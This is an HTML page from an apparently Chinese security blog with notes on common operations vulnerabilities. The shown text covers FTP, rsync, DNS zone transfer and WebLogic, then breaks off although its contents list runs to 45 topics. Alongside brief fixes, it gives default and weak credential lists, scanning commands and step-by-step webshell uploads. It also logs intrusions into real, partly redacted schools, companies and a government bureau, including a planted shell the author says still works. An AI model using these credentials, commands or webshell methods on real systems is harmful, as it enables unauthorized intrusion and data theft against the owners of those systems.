@@ -1,0 +1,1969 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<title>安全运维那些洞-Aerfa - Pa55w0rd的博客</title>
+	<meta name="description" content="来源于网络，回馈于网络。以前简单的记录下学习的笔记，现在轻轻地拿出来与大家分享。这份paper没有太多个人思路，但却不失某一漏洞的利用方法及遇到的问题（当时有的没有解决，然而后来也没有继续补充）。仅单纯的按照自己的思路，记录和总结常见的运维相关安全漏洞。难免会有错误与不足（包括不全面）之处，还请大家不吝赐教。">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta property="og:image" content="">
+	<link rel="shortcut icon" href="/assets/img/favicon/favicon.ico" type="image/x-icon">
+	<link rel="apple-touch-icon" href="/assets/img/favicon/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicon/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicon/apple-touch-icon-114x114.png">
+	<!-- Chrome, Firefox OS and Opera -->
+	<meta name="theme-color" content="#2d2a2a">
+	<!-- Windows Phone -->
+	<meta name="msapplication-navbutton-color" content="#2d2a2a">
+	<!-- iOS Safari -->
+	<meta name="apple-mobile-web-app-status-bar-style" content="#2d2a2a">
+
+	<link href="https://fonts.googleapis.com/css?family=Finger+Paint|PT+Sans:400,700" rel="stylesheet">
+	<link rel="stylesheet" href="/assets/fonts/font-awesome/css/font-awesome.min.css">
+	<link rel="stylesheet" href="/assets/css/main.css">
+</head>
+
+<body>
+
+  <aside class="sidebar">
+
+  <div class="sidebar-container">
+    <div class="sidebar-logo">
+      <a href="/" class="logo">Pa55w0rd</a>
+    </div>
+
+    <menu class="sidebar-menu">
+      <li class="menu-items"><a class="menu-links" href="/">主页</a></li>
+      <li class="menu-items"><a class="menu-links" href="/list/">目录</a></li>
+      <li class="menu-items"><a class="menu-links" href="/about/">关于我</a></li>
+      <li class="menu-items"><a class="menu-links" href="https://github.com/Pa55w0rd/">Github 项目</a></li>
+    </menu>
+
+    <div class="sidebar-social">
+ <!--     <li class="social-items"><a href="https://www.facebook.com/" class="social-links"><i class="social-icons fa fa-facebook" aria-hidden="true"></i></a></li>
+      <li class="social-items"><a href="https://twitter.com/" class="social-links"><i class="social-icons fa fa-twitter" aria-hidden="true"></i></a></li>
+      <li class="social-items"><a href="https://plus.google.com/" class="social-links"><i class="social-icons fa fa-google-plus" aria-hidden="true"></i></a></li>
+      <li class="social-items"><a href="https://github.com/https://github.com/Pa55w0rd" class="social-links"><i class="social-icons fa fa-github" aria-hidden="true"></i></a></li>
+-->
+		      <div>Copyright © 2018 www.pa55w0rd.club All Rights Reserved </div>
+	  <div>Email：pa55w0rd@aliyun.com </div>
+	</div>
+
+  </div>
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-126660308-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-126660308-1');
+</script>
+
+</aside>
+
+
+  <main role="main">
+    <div class="content">
+      <article class="page-article">
+  <div class="wrap-content">
+    <header class="page-header">
+      <h1 class="page-title">安全运维那些洞-Aerfa</h1>
+      <div class="page-date"><span>2018, Oct 29&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
+    </header>
+    <div class="page-content">
+      
+      <ul id="markdown-toc">
+  <li><a href="#0-readme" id="markdown-toc-0-readme">0 Readme</a></li>
+  <li><a href="#1-ftp匿名访问或弱口令" id="markdown-toc-1-ftp匿名访问或弱口令">1 ftp匿名访问或弱口令</a>    <ul>
+      <li><a href="#11-ftp匿名访问" id="markdown-toc-11-ftp匿名访问">1.1 ftp匿名访问</a></li>
+      <li><a href="#12-ftp常见弱口令" id="markdown-toc-12-ftp常见弱口令">1.2 ftp常见弱口令</a></li>
+      <li><a href="#13-边学边用" id="markdown-toc-13-边学边用">1.3 边学边用</a></li>
+    </ul>
+  </li>
+  <li><a href="#2-rsync匿名访问" id="markdown-toc-2-rsync匿名访问">2 rsync匿名访问</a>    <ul>
+      <li><a href="#21-利用方法" id="markdown-toc-21-利用方法">2.1 利用方法</a></li>
+      <li><a href="#22-安全配置" id="markdown-toc-22-安全配置">2.2 安全配置</a></li>
+      <li><a href="#23-活学活用" id="markdown-toc-23-活学活用">2.3 活学活用</a></li>
+    </ul>
+  </li>
+  <li><a href="#3-dns域传送漏洞" id="markdown-toc-3-dns域传送漏洞">3 DNS域传送漏洞</a>    <ul>
+      <li><a href="#31-漏洞成因" id="markdown-toc-31-漏洞成因">3.1 漏洞成因</a></li>
+      <li><a href="#32-攻击方式" id="markdown-toc-32-攻击方式">3.2 攻击方式</a></li>
+      <li><a href="#33-修复方案" id="markdown-toc-33-修复方案">3.3 修复方案</a></li>
+    </ul>
+  </li>
+  <li><a href="#4-weblogic弱口令" id="markdown-toc-4-weblogic弱口令">4 weblogic弱口令</a>    <ul>
+      <li><a href="#41-基本信息" id="markdown-toc-41-基本信息">4.1 基本信息</a></li>
+      <li><a href="#42-利用方式" id="markdown-toc-42-利用方式">4.2 利用方式</a></li>
+      <li><a href="#43-安全配置" id="markdown-toc-43-安全配置">4.3 安全配置</a></li>
+      <li><a href="#44-现学现卖" id="markdown-toc-44-现学现卖">4.4 现学现卖</a></li>
+    </ul>
+  </li>
+  <li><a href="#5-struts漏洞" id="markdown-toc-5-struts漏洞">5 struts漏洞</a>    <ul>
+      <li><a href="#51-s2-016命令执行漏洞" id="markdown-toc-51-s2-016命令执行漏洞">5.1 S2-016命令执行漏洞</a></li>
+      <li><a href="#52-s2-017重定向漏洞" id="markdown-toc-52-s2-017重定向漏洞">5.2 S2-017重定向漏洞</a></li>
+      <li><a href="#53-s2-019命令执行漏洞" id="markdown-toc-53-s2-019命令执行漏洞">5.3 S2-019命令执行漏洞</a></li>
+    </ul>
+  </li>
+  <li><a href="#6-web服务器解析漏洞" id="markdown-toc-6-web服务器解析漏洞">6 web服务器解析漏洞</a>    <ul>
+      <li><a href="#61-iis-60" id="markdown-toc-61-iis-60">6.1 IIS 6.0</a></li>
+      <li><a href="#62-iis-70iis-75nginx0837" id="markdown-toc-62-iis-70iis-75nginx0837">6.2 IIS 7.0/IIS 7.5/Nginx&lt;=0.8.37</a></li>
+      <li><a href="#63-nginx0837" id="markdown-toc-63-nginx0837">6.3 Nginx&lt;=0.8.37</a></li>
+      <li><a href="#64-apache" id="markdown-toc-64-apache">6.4 Apache</a></li>
+      <li><a href="#65-lighttpd" id="markdown-toc-65-lighttpd">6.5 lighttpd</a></li>
+      <li><a href="#66-windows环境" id="markdown-toc-66-windows环境">6.6 windows环境</a></li>
+    </ul>
+  </li>
+  <li><a href="#7-php-cgi远程任意代码执行漏洞" id="markdown-toc-7-php-cgi远程任意代码执行漏洞">7 PHP-CGI远程任意代码执行漏洞</a>    <ul>
+      <li><a href="#71-本地包含执行代码" id="markdown-toc-71-本地包含执行代码">7.1 本地包含执行代码</a></li>
+      <li><a href="#72-远程包含执行代码" id="markdown-toc-72-远程包含执行代码">7.2 远程包含执行代码</a></li>
+    </ul>
+  </li>
+  <li><a href="#8-fck编辑器上传漏洞" id="markdown-toc-8-fck编辑器上传漏洞">8 FCK编辑器上传漏洞</a>    <ul>
+      <li><a href="#81-漏洞利用" id="markdown-toc-81-漏洞利用">8.1 漏洞利用</a></li>
+    </ul>
+  </li>
+  <li><a href="#9-apache-server-status对外暴露" id="markdown-toc-9-apache-server-status对外暴露">9 Apache Server Status对外暴露</a>    <ul>
+      <li><a href="#91-利用方式" id="markdown-toc-91-利用方式">9.1 利用方式</a></li>
+    </ul>
+  </li>
+  <li><a href="#10-网站备份文件可下载" id="markdown-toc-10-网站备份文件可下载">10 网站备份文件可下载</a>    <ul>
+      <li><a href="#101-利用方式" id="markdown-toc-101-利用方式">10.1 利用方式</a></li>
+    </ul>
+  </li>
+  <li><a href="#11-目录遍历并查看敏感数据" id="markdown-toc-11-目录遍历并查看敏感数据">11 目录遍历并查看敏感数据</a>    <ul>
+      <li><a href="#111-利用方式" id="markdown-toc-111-利用方式">11.1 利用方式</a></li>
+    </ul>
+  </li>
+  <li><a href="#12-snmp信息泄露" id="markdown-toc-12-snmp信息泄露">12 SNMP信息泄露</a>    <ul>
+      <li><a href="#121-基本原理" id="markdown-toc-121-基本原理">12.1 基本原理</a></li>
+      <li><a href="#122-snmp弱口令" id="markdown-toc-122-snmp弱口令">12.2 snmp弱口令</a></li>
+      <li><a href="#123-snmp获取管理员密码" id="markdown-toc-123-snmp获取管理员密码">12.3 snmp获取管理员密码</a></li>
+      <li><a href="#124-实战演练" id="markdown-toc-124-实战演练">12.4 实战演练</a></li>
+    </ul>
+  </li>
+  <li><a href="#13-svn源码泄露" id="markdown-toc-13-svn源码泄露">13 SVN源码泄露</a>    <ul>
+      <li><a href="#131-svn介绍" id="markdown-toc-131-svn介绍">13.1 SVN介绍</a></li>
+      <li><a href="#132-漏洞原理" id="markdown-toc-132-漏洞原理">13.2 漏洞原理</a></li>
+    </ul>
+  </li>
+  <li><a href="#14-hadhoop应用对外访问" id="markdown-toc-14-hadhoop应用对外访问">14 hadhoop应用对外访问</a>    <ul>
+      <li><a href="#141-基础概念" id="markdown-toc-141-基础概念">14.1 基础概念</a></li>
+      <li><a href="#142-漏洞利用" id="markdown-toc-142-漏洞利用">14.2 漏洞利用</a></li>
+    </ul>
+  </li>
+  <li><a href="#15-nagios信息泄露" id="markdown-toc-15-nagios信息泄露">15 Nagios信息泄露</a>    <ul>
+      <li><a href="#151-漏洞利用" id="markdown-toc-151-漏洞利用">15.1 漏洞利用</a></li>
+    </ul>
+  </li>
+  <li><a href="#16-rtx即时通信信息泄露" id="markdown-toc-16-rtx即时通信信息泄露">16 RTX即时通信信息泄露</a>    <ul>
+      <li><a href="#161-漏洞利用" id="markdown-toc-161-漏洞利用">16.1 漏洞利用</a></li>
+      <li><a href="#162-动手实践" id="markdown-toc-162-动手实践">16.2 动手实践</a></li>
+    </ul>
+  </li>
+  <li><a href="#17-ganglia系统监控信息泄露" id="markdown-toc-17-ganglia系统监控信息泄露">17 Ganglia系统监控信息泄露</a>    <ul>
+      <li><a href="#171-漏洞利用" id="markdown-toc-171-漏洞利用">17.1 漏洞利用</a></li>
+    </ul>
+  </li>
+  <li><a href="#18-j2ee应用架构web服务器搭配不当" id="markdown-toc-18-j2ee应用架构web服务器搭配不当">18 j2ee应用架构（web服务器搭配不当）</a>    <ul>
+      <li><a href="#181-漏洞成因" id="markdown-toc-181-漏洞成因">18.1 漏洞成因</a></li>
+      <li><a href="#182-漏洞利用" id="markdown-toc-182-漏洞利用">18.2 漏洞利用</a></li>
+      <li><a href="#183-修复方案" id="markdown-toc-183-修复方案">18.3 修复方案</a></li>
+    </ul>
+  </li>
+  <li><a href="#19-jenkins平台未设置登录验证" id="markdown-toc-19-jenkins平台未设置登录验证">19 Jenkins平台未设置登录验证</a>    <ul>
+      <li><a href="#191-漏洞利用" id="markdown-toc-191-漏洞利用">19.1 漏洞利用</a></li>
+    </ul>
+  </li>
+  <li><a href="#20-zabbix默认口令" id="markdown-toc-20-zabbix默认口令">20 zabbix默认口令</a>    <ul>
+      <li><a href="#201-基础知识" id="markdown-toc-201-基础知识">20.1 基础知识</a></li>
+      <li><a href="#202-利用方式" id="markdown-toc-202-利用方式">20.2 利用方式</a></li>
+    </ul>
+  </li>
+  <li><a href="#21-zenoss默认口令" id="markdown-toc-21-zenoss默认口令">21 zenoss默认口令</a>    <ul>
+      <li><a href="#211-基本知识" id="markdown-toc-211-基本知识">21.1 基本知识</a></li>
+      <li><a href="#212-漏洞利用" id="markdown-toc-212-漏洞利用">21.2 漏洞利用</a></li>
+    </ul>
+  </li>
+  <li><a href="#22-resin任意文件读取" id="markdown-toc-22-resin任意文件读取">22 Resin任意文件读取</a>    <ul>
+      <li><a href="#221-基本知识" id="markdown-toc-221-基本知识">22.1 基本知识</a></li>
+      <li><a href="#222-漏洞利用" id="markdown-toc-222-漏洞利用">22.2 漏洞利用</a></li>
+      <li><a href="#223-实例演练" id="markdown-toc-223-实例演练">22.3 实例演练</a></li>
+    </ul>
+  </li>
+  <li><a href="#23-memcache未限制访问ip" id="markdown-toc-23-memcache未限制访问ip">23 memcache未限制访问IP</a>    <ul>
+      <li><a href="#231-基础知识" id="markdown-toc-231-基础知识">23.1 基础知识</a></li>
+      <li><a href="#232-漏洞利用" id="markdown-toc-232-漏洞利用">23.2 漏洞利用</a></li>
+      <li><a href="#233-实战演练" id="markdown-toc-233-实战演练">23.3 实战演练</a></li>
+    </ul>
+  </li>
+  <li><a href="#24-jboss配置不当" id="markdown-toc-24-jboss配置不当">24 Jboss配置不当</a>    <ul>
+      <li><a href="#241-基本信息" id="markdown-toc-241-基本信息">24.1 基本信息</a></li>
+      <li><a href="#242-漏洞利用" id="markdown-toc-242-漏洞利用">24.2 漏洞利用</a></li>
+      <li><a href="#243-实例应用" id="markdown-toc-243-实例应用">24.3 实例应用</a>        <ul>
+          <li><a href="#1-admin-console-getshell" id="markdown-toc-1-admin-console-getshell">&lt;1&gt; admin-console getshell</a></li>
+          <li><a href="#2-jmx-console-getshell" id="markdown-toc-2-jmx-console-getshell">&lt;2&gt; jmx-console getshell</a></li>
+          <li><a href="#3-web-console-getshell" id="markdown-toc-3-web-console-getshell">&lt;3&gt; web-console getshell</a></li>
+          <li><a href="#41-invoker-getshell" id="markdown-toc-41-invoker-getshell">&lt;41&gt; invoker getshell</a></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li><a href="#25-测试机外网可访问" id="markdown-toc-25-测试机外网可访问">25 测试机外网可访问</a></li>
+  <li><a href="#26-padding-oracle-attack" id="markdown-toc-26-padding-oracle-attack">26 padding oracle attack</a>    <ul>
+      <li><a href="#261-基础知识" id="markdown-toc-261-基础知识">26.1 基础知识</a></li>
+      <li><a href="#262-漏洞利用" id="markdown-toc-262-漏洞利用">26.2 漏洞利用</a></li>
+    </ul>
+  </li>
+  <li><a href="#27-tomcat弱口令" id="markdown-toc-27-tomcat弱口令">27 tomcat弱口令</a>    <ul>
+      <li><a href="#271-基础知识" id="markdown-toc-271-基础知识">27.1 基础知识</a></li>
+      <li><a href="#272-漏洞利用" id="markdown-toc-272-漏洞利用">27.2 漏洞利用</a></li>
+    </ul>
+  </li>
+  <li><a href="#28-phpmyadmin弱口令" id="markdown-toc-28-phpmyadmin弱口令">28 phpmyadmin弱口令</a></li>
+  <li><a href="#29-mongodb配置不当" id="markdown-toc-29-mongodb配置不当">29 MongoDB配置不当</a>    <ul>
+      <li><a href="#291-基本介绍" id="markdown-toc-291-基本介绍">29.1 基本介绍</a></li>
+      <li><a href="#292-未授权访问" id="markdown-toc-292-未授权访问">29.2 未授权访问</a></li>
+      <li><a href="#293-实战演练" id="markdown-toc-293-实战演练">29.3 实战演练</a></li>
+    </ul>
+  </li>
+  <li><a href="#30-各种敏感后台对外开放" id="markdown-toc-30-各种敏感后台对外开放">30 各种敏感后台对外开放</a></li>
+  <li><a href="#31-django配置不当致信息泄露" id="markdown-toc-31-django配置不当致信息泄露">31 Django配置不当致信息泄露</a></li>
+  <li><a href="#32-redis未授权访问" id="markdown-toc-32-redis未授权访问">32 Redis未授权访问</a>    <ul>
+      <li><a href="#321-基础知识" id="markdown-toc-321-基础知识">32.1 基础知识</a></li>
+      <li><a href="#322-利用方式" id="markdown-toc-322-利用方式">32.2 利用方式</a></li>
+      <li><a href="#323-实战演练" id="markdown-toc-323-实战演练">32.3 实战演练</a></li>
+    </ul>
+  </li>
+  <li><a href="#33-ldap未授权访问" id="markdown-toc-33-ldap未授权访问">33 LDAP未授权访问</a>    <ul>
+      <li><a href="#331-基础知识" id="markdown-toc-331-基础知识">33.1 基础知识</a></li>
+      <li><a href="#332-利用方式" id="markdown-toc-332-利用方式">33.2 利用方式</a></li>
+      <li><a href="#333-应用实例" id="markdown-toc-333-应用实例">33.3 应用实例</a></li>
+    </ul>
+  </li>
+  <li><a href="#34-smb弱口令" id="markdown-toc-34-smb弱口令">34 SMB弱口令</a>    <ul>
+      <li><a href="#341-smb字典" id="markdown-toc-341-smb字典">34.1 smb字典</a></li>
+      <li><a href="#342-ms08-067溢出" id="markdown-toc-342-ms08-067溢出">34.2 MS08-067溢出</a></li>
+    </ul>
+  </li>
+  <li><a href="#35-openssl心脏出血" id="markdown-toc-35-openssl心脏出血">35 openssl心脏出血</a></li>
+  <li><a href="#36-squid代理默认端口" id="markdown-toc-36-squid代理默认端口">36 squid代理默认端口</a></li>
+  <li><a href="#37-glassfish-web中间件弱口令" id="markdown-toc-37-glassfish-web中间件弱口令">37 GlassFish web中间件弱口令</a></li>
+  <li><a href="#38-php-fastcgi远程利用" id="markdown-toc-38-php-fastcgi远程利用">38 PHP FastCGI远程利用</a></li>
+  <li><a href="#39-elasticsearch代码执行" id="markdown-toc-39-elasticsearch代码执行">39 elasticsearch代码执行</a></li>
+  <li><a href="#40-websphere-web中间件弱口令" id="markdown-toc-40-websphere-web中间件弱口令">40 websphere web中间件弱口令</a></li>
+  <li><a href="#41-zebra路由弱密码" id="markdown-toc-41-zebra路由弱密码">41 zebra路由弱密码</a></li>
+  <li><a href="#42-rundeck-web" id="markdown-toc-42-rundeck-web">42 rundeck web</a></li>
+  <li><a href="#43-dns未设置spf导致邮箱欺骗漏洞" id="markdown-toc-43-dns未设置spf导致邮箱欺骗漏洞">43 dns未设置spf导致邮箱欺骗漏洞</a></li>
+  <li><a href="#44-cvs源码泄露" id="markdown-toc-44-cvs源码泄露">44 CVS源码泄露</a>    <ul>
+      <li><a href="#441-基础知识" id="markdown-toc-441-基础知识">44.1 基础知识</a></li>
+      <li><a href="#442-实例应用" id="markdown-toc-442-实例应用">44.2 实例应用</a></li>
+    </ul>
+  </li>
+  <li><a href="#45-tomcat-examples-directory漏洞" id="markdown-toc-45-tomcat-examples-directory漏洞">45 Tomcat examples directory漏洞</a></li>
+</ul>
+
+<h1 id="0-readme">0 Readme</h1>
+
+<p>来源于网络，回馈于网络。</p>
+
+<p>以前简单的记录下学习的笔记，现在轻轻地拿出来与大家分享。</p>
+
+<p>这份paper没有太多个人思路，但却不失某一漏洞的利用方法及遇到的问题（当时有的没有解决，然而后来也没有继续补充）。</p>
+
+<p>仅单纯的按照自己的思路，记录和总结常见的运维相关安全漏洞。难免会有错误与不足（包括不全面）之处，还请大家不吝赐教。</p>
+
+<h1 id="1-ftp匿名访问或弱口令">1 ftp匿名访问或弱口令</h1>
+
+<h2 id="11-ftp匿名访问">1.1 ftp匿名访问</h2>
+
+<p>Username = anonymous &amp;&amp; password = (null )</p>
+
+<p>（1）cmd下，ftp xx.xx.xx.xx</p>
+
+<p>（2）文件夹，ftp://xx.xx.xx.xx</p>
+
+<h2 id="12-ftp常见弱口令">1.2 ftp常见弱口令</h2>
+
+<p>（1）从wooyun的漏洞案例中看来，常见的弱口令：</p>
+
+<p>网站域名（例如baidu.com） <code class="highlighter-rouge">baidu / baidu</code></p>
+
+<p>（2）从xx项目中（漏扫扫出），弱口令为：</p>
+
+<p><code class="highlighter-rouge">ftp / ftp</code></p>
+
+<p>（3）网站使用lampp套装，未修改默认ftp密码：</p>
+
+<p><code class="highlighter-rouge">nobody / lampp</code></p>
+
+<h2 id="13-边学边用">1.3 边学边用</h2>
+
+<p>xx.xx.xx.xx 匿名访问 ftp / ftp
+均可以登录</p>
+
+<p>使用8uftp登陆：</p>
+
+<p><img src="\assets\img\安全运维\file_html_3d03e9ebaafe6524.png" alt="" /></p>
+
+<p>在文件夹中直接输入地址登陆：</p>
+
+<p><img src="\assets\img\安全运维\file_html_fc4bacc7b391f84f.png" alt="" /></p>
+
+<p>比较两者之间的差异：前者下载文件会受到大小的限制，后者则不会。</p>
+
+<p>xx.xx.xx.xx yy学校</p>
+
+<p><img src="\assets\img\安全运维\file_html_e8776ff5ccdeee62.png" alt="" /></p>
+
+<p>xx.xx.xx.xx zz学校</p>
+
+<p><img src="\assets\img\安全运维\file_html_158b89f932faeb71.png" alt="" /></p>
+
+<h1 id="2-rsync匿名访问">2 rsync匿名访问</h1>
+
+<p>参考： drops.wooyun.org/papers/161</p>
+
+<p>rsync是一个远程数据同步工具，用 “rsync
+算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。</p>
+
+<p>下载文件：</p>
+
+<p>./rsync -vzrtopg –progress
+–deleteusername@xxx.xxx.xxx.xxx::out
+/home/test/getfile</p>
+
+<p>上传文件：</p>
+
+<p>/user/bin/rsync -vzrtopg –progress
+/home/test/getfile</p>
+
+<h2 id="21-利用方法">2.1 利用方法</h2>
+
+<p>rsync
+默认端口是873，可使用nmap进行扫描：</p>
+
+<p>nmap –n –open –p 873 x.x.x.x/24</p>
+
+<p>尝试上传、下载文件( kali
+中)：</p>
+
+<p>rsync 10.210.208.39::</p>
+
+<p>或 rsync –vvvv
+rsync://10.210.208.39::</p>
+
+<h2 id="22-安全配置">2.2 安全配置</h2>
+
+<ul>
+  <li>
+    <p>限定访问IP：IP
+Tables防火墙或修改配置文件rsync.conf</p>
+  </li>
+  <li>
+    <p>不允许匿名访问，添加用户口令</p>
+  </li>
+</ul>
+
+<h2 id="23-活学活用">2.3 活学活用</h2>
+
+<ul>
+  <li>xx.xx.xx.xx 连接失败</li>
+</ul>
+
+<p><img src="\assets\img\安全运维\file_html_86a6c0dd0ec67cd3.png" alt="" /></p>
+
+<ul>
+  <li>通信成功，却不知道该如何操作</li>
+</ul>
+
+<p><img src="\assets\img\安全运维\file_html_d6ea7f3e9ce65313.png" alt="" /></p>
+
+<ul>
+  <li>可以查看到目录，但是进一步访问需要密码</li>
+</ul>
+
+<p><img src="\assets\img\安全运维\file_html_93d8b6936279365a.png" alt="" /></p>
+
+<p>可以查看到目录，但是禁止进一步访问</p>
+
+<p>xx窝</p>
+
+<p><img src="\assets\img\安全运维\file_html_d416cd4216771f91.png" alt="" /></p>
+
+<ul>
+  <li>http://www.xxx.gov.cn xx局</li>
+</ul>
+
+<p><code class="highlighter-rouge">rsync -v xx.xx.xx.xx::</code></p>
+
+<p><img src="\assets\img\安全运维\file_html_29db8cfd2f6f9255.png" alt="" /></p>
+
+<p>上传webshell: # rsync -av /root/Desktop/youxiu.aspx
+xx.xx.xx.xx::Etest</p>
+
+<p><img src="\assets\img\安全运维\file_html_7ba40be2f34f1334.png" alt="" /></p>
+
+<p>确认是否成功：# rsync -v xx.xx.xx.xx::Etest</p>
+
+<p><img src="\assets\img\安全运维\file_html_ac23219ff525104.png" alt="" /></p>
+
+<p>获取wenshell: http://www.xx.cn/youxiu.aspx admin</p>
+
+<p><img src="\assets\img\安全运维\file_html_c97ac1aa5603d31e.png" alt="" /></p>
+
+<p>xx.xx.xx.xx yy公司OA系统</p>
+
+<p><img src="\assets\img\安全运维\file_html_afd89947e3e3b0f4.png" alt="" /></p>
+
+<h1 id="3-dns域传送漏洞">3 DNS域传送漏洞</h1>
+
+<p>参考： drops.wooyun.org/papers/64</p>
+
+<p>DNS主备之间数据同步使用的是dns域传送，如果配置不当，就会导致匿名用户获取DNS服务器某一域的所有记录，将整个企业的基础业务以及网络架构对外暴露从而造成严重的信息泄露，甚至导致企业网络被渗透。</p>
+
+<h2 id="31-漏洞成因">3.1 漏洞成因</h2>
+
+<p>默认安装BIND
+，配置项中没有allow-transfer项，就会出现dns域传送
+漏洞</p>
+
+<p>域传送关键配置项:</p>
+
+<p>allow-transfer{ipaddress;};
+通过ip限制可进行域传送的服务器</p>
+
+<p>allow-transfer{key transfer;};
+通过key限制可以进行域传送的服务器</p>
+
+<p>设置方式有两种：</p>
+
+<ul>
+  <li>
+    <p>在option配置域</p>
+  </li>
+  <li>
+    <p>在zone配置域</p>
+  </li>
+</ul>
+
+<p>优先级为： zone &gt; option</p>
+
+<h2 id="32-攻击方式">3.2 攻击方式</h2>
+
+<p>恶意用户可以通过dns域传送获取被攻击域下所有的子域名。导致一些非公开域名（测试域名、内部域名）泄露。而此类域名的安全性相对较低，更容易遭受攻击者的攻击，比如内部测试机往往缺乏必要的安全设置。</p>
+
+<ul>
+  <li>dos下进行测试</li>
+</ul>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>C:\Users\ljn&gt;nslookup
+
+&gt; set type=ns
+
+&gt; 12306.cn
+
+&gt; server dns1.zdnscloud.biz
+
+&gt; ls 12306.cn
+</code></pre>
+</div>
+
+<ul>
+  <li>kali中进行测试</li>
+</ul>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>\# dig @1.1.1.1 12306.cn axfr
+(1.1.1.1为dns服务器IP，12306.cn为测试域名)
+
+或 \# dnsenum 12306.cn
+</code></pre>
+</div>
+
+<h2 id="33-修复方案">3.3 修复方案</h2>
+
+<p>只需在限制相应的zone、optio中添加allow-transfer限制可以进行同步的服务器，限制方式有两种:</p>
+<ul>
+  <li>限制IP</li>
+  <li>使用key认证。</li>
+</ul>
+
+<h1 id="4-weblogic弱口令">4 weblogic弱口令</h1>
+
+<p>参考： drops.wooyun.org/tips/402</p>
+
+<h2 id="41-基本信息">4.1 基本信息</h2>
+
+<p>Weblogic是美国bea公司出品的一个application
+server（基于javaee架构的中间件），BEA
+Weblogic用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的java应用服务器。</p>
+
+<p>很多weblogic服务器安装时采用默认密码，攻击者很容易进入weblogic控制台获取相应权限。</p>
+
+<p>默认weblogic管理员账号密码： <code class="highlighter-rouge">weblogic /
+weblogic</code></p>
+
+<p>默认weblogic开放端口： 7001</p>
+
+<p>默认weblogic访问路径：
+<code class="highlighter-rouge">http://xxxx:7001/console</code></p>
+
+<p>从Default Passwords |
+CIRT.net获取常见weblogic默认密码：</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>Oracle-WebLogic：weblogic / weblogic
+
+Oracle-WebLogic 11g：weblogic / welcome1 (实践)
+
+Oracle-WebLogic：system / password
+
+Oracle-Weblogic(Version: 9.0 Beta(Diablo))：weblogic / weblogic
+
+Oracle-WebLogic Process Integrator：admin / security
+
+Oracle-WebLogic Process Integrator：mary / password
+
+Oracle-WebLogic Process Integrator：joe / password
+
+Oracle-WebLogic Process Integrator：wlcsystem / wlcsystem
+
+Oracle-WebLogic Process Integrator：wlpisystem / wlpisystem
+</code></pre>
+</div>
+
+<p>查看wooyun漏洞案例，积累常见弱口令：</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>weblogic / weblogic123
+
+weblogic / 12345678
+
+admin / 12345678
+</code></pre>
+</div>
+
+<h2 id="42-利用方式">4.2 利用方式</h2>
+
+<p>寻找weblogic服务器方法：</p>
+
+<ul>
+  <li>
+    <p>使用 IIS PUT Scaner
+扫描80、8080端口，查看HTTP
+banner信息，确定为weblogic；</p>
+  </li>
+  <li>
+    <p>直接扫描7001端口或者baidu
+inurl: :7001/console (待尝试)</p>
+  </li>
+</ul>
+
+<p>利用弱口令进入管理后台，在控制台部署一个web应用：</p>
+
+<p>Deploy =&gt; web application modules =&gt; Deploy a new Web Application
+Module… =&gt;upload your file(s) =&gt; Deploy</p>
+
+<p>在Web应用中包含模块：必须要有一个servlet或JSP
+web.xml文件，包含web应用程序的信息</p>
+
+<h2 id="43-安全配置">4.3 安全配置</h2>
+
+<p>http://download.oracle.com/docs/cd/E12890_01/ales/docs32/integrateappenviron/configWLS.html#wp1099454</p>
+
+<h2 id="44-现学现卖">4.4 现学现卖</h2>
+
+<p>http://xx.xx.xx.xx:7001/console/login/LoginForm.jsp</p>
+
+<p><img src="\assets\img\安全运维\file_html_a09bb089c1c3b312.png" alt="" /></p>
+
+<p>weblogic / 12345678</p>
+
+<p><img src="\assets\img\安全运维\file_html_6d6c9016367bb35b.png" alt="" /></p>
+
+<p>部署war包（war包其实是index.jsp + META-INF + WEB-INF的压缩包）：</p>
+
+<p>先制作war包（需安装java环境）：</p>
+
+<p>c:\app&gt;cd c:/program files/java/dk1.8.0_31/bin</p>
+
+<p>c:\Program Files\Java\jdk1.8.0_31\bin&gt;jar -cvf app.war c:/app</p>
+
+<p><img src="\assets\img\安全运维\file_html_3493c9640cf370ac.png" alt="" /></p>
+
+<p><img src="\assets\img\安全运维\file_html_ba1e3acff7df0d95.png" alt="" /></p>
+
+<p>部署——&gt;安装——&gt;上载文件——&gt;一直点确定即可，得到shell</p>
+
+<p>（自己制作war包失败，重新下载了一个war包，上传）</p>
+
+<p><a href="http://xx.xx.xx.xx:7001/index/a.jsp">http://xx.xx.xx.xx:7001/index/a.jsp</a> (安全起见，已删除)</p>
+
+<p>http://xx.xx.xx.xx:7001/index/a.jsp?sort=1&amp;dir=E%3A\phpstudy\WWW</p>
+
+<p><img src="\assets\img\安全运维\file_html_cf68ba09dbca62df.png" alt="" /></p>
+
+<p>翻目录：</p>
+
+<p><img src="\assets\img\安全运维\file_html_63592e979d64fae2.png" alt="" /></p>
+
+<p><a href="http://xx.xx.xx.xx/weimall">http://xx.xx.xx.xx/weimall</a> mall.xx.cn v.xx.cn</p>
+
+<p><img src="\assets\img\安全运维\file_html_b9a7ba7d2ab3078c.png" alt="" /></p>
+
+<p><a href="http://xx.xx.xx.xx/fenxiao/">http://xx.xx.xx.xx/fenxiao/</a> 米某网</p>
+
+<p><a href="http://xx.x.xx.xx/fenxiao/api/client/uc.php">http://xx.x.xx.xx/fenxiao/api/client/uc.php</a> youxiu
+（已修改时间，该shell好用）</p>
+
+<p><code class="highlighter-rouge">net user</code></p>
+
+<p><img src="\assets\img\安全运维\file_html_d3ed608fe971124a.png" alt="" /></p>
+
